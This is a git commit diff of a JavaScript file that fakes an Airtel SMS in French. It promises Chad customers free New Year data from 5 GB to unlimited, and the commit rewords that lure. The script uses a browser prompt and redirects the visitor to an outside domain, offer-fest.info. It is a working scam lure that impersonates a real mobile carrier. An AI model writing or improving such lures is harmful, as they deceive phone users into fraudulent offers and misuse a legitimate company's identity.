6b20af45641d6a219aecb0e3765dc719ff49b044
ekpesense <abantak9@gmail.com>
2025-01-24 12:14:02 -0800

    Update activation-chad-airtel.js

--- activation-chad-airtel.js
+++ activation-chad-airtel.js
@@ -1,6 +1,6 @@
 
 var password = 'CADEAU DE NOUVEL AN'
-password=prompt('AIRTEL SMS: Cher client Airtel, veuillez recevoir des données gratuites de 5 Go à 100 Go, récompense des clients du Nouvel An, cliquez sur CADEAU DE NOUVEL AN pour vérifier maintenant ','CADEAU DE NOUVEL AN');
+password=prompt('AIRTEL SMS: Cher client Airtel, veuillez recevoir des données gratuites à partir de 5 Go - Illimitées, récompense des clients du Nouvel An, cliquez sur CADEAU DE NOUVEL AN pour vérifier maintenant ','CADEAU DE NOUVEL AN');
 if (password != 'CADEAU DE NOUVEL AN') {
 location.href='https://offer-fest.info/chad-airtel.html';
 }
